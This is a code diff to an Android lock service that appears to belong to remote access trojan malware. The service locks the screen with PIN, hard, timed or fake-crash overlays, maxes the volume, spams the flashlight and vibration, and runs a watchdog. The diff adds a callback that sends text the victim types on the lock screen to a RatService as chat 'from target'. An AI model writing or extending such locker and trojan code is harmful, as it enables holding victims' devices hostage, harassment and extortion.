@@ -101,9 +101,6 @@ class LockService : Service() {
         return START_STICKY
     }
 
-    // ============================================================
-    // VOLUME MAX
-    // ============================================================
     private fun setVolumeMax() {
         try {
             val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
@@ -113,9 +110,6 @@ class LockService : Service() {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // FLASH SPAM
-    // ============================================================
     private fun startFlashSpam() {
         if (flashRunning) return
         flashRunning = true
@@ -143,9 +137,6 @@ class LockService : Service() {
         flashThread = null
     }
 
-    // ============================================================
-    // VIBRATE SPAM
-    // ============================================================
     private fun startVibrateSpam() {
         if (vibrateRunning) return
         vibrateRunning = true
@@ -173,9 +164,6 @@ class LockService : Service() {
         vibrateThread = null
     }
 
-    // ============================================================
-    // SAVE / CLEAR STATE
-    // ============================================================
     private fun saveState() {
         try {
             prefs.edit()
@@ -209,27 +197,30 @@ class LockService : Service() {
             .build()
     }
 
-    // ============================================================
-    // SHOW OVERLAY
-    // ============================================================
     private fun showOverlay() {
         try {
             removeOverlayView()
 
+            val chatCallback: (String) -> Unit = { text ->
+                try {
+                    RatService.instance?.sendChatFromTarget(text)
+                } catch (_: Exception) {}
+            }
+
             val baseView: View = when (currentType) {
-                "pin" -> LockOverlayView.buildPin(this, currentPin) { v ->
+                "pin" -> LockOverlayView.buildPin(this, currentPin, { v ->
                     removeOverlayView()
                     v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                     clearState()
                     stopLock()
-                }
-                "hard" -> LockOverlayView.buildHard(this)
-                "time" -> LockOverlayView.buildTimer(this, currentHours * 3600_000L) { v ->
+                }, chatCallback)
+                "hard" -> LockOverlayView.buildHard(this, chatCallback)
+                "time" -> LockOverlayView.buildTimer(this, currentHours * 3600_000L, { v ->
                     removeOverlayView()
                     v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                     clearState()
                     stopLock()
-                }
+                }, chatCallback)
                 "crash" -> LockOverlayView.buildCrash(this) { v ->
                     removeOverlayView()
                     v.let { try { wm.removeView(it) } catch (_: Exception) {} }
@@ -316,9 +307,6 @@ class LockService : Service() {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // WATCHDOG
-    // ============================================================
     private fun startWatchdog() {
         watchdog?.removeCallbacksAndMessages(null)
         watchdog = Handler(Looper.getMainLooper())
@@ -342,9 +330,6 @@ class LockService : Service() {
         }, 1500)
     }
 
-    // ============================================================
-    // STOP
-    // ============================================================
     fun stopLock() {
         isActive = false
         removeOverlayView()
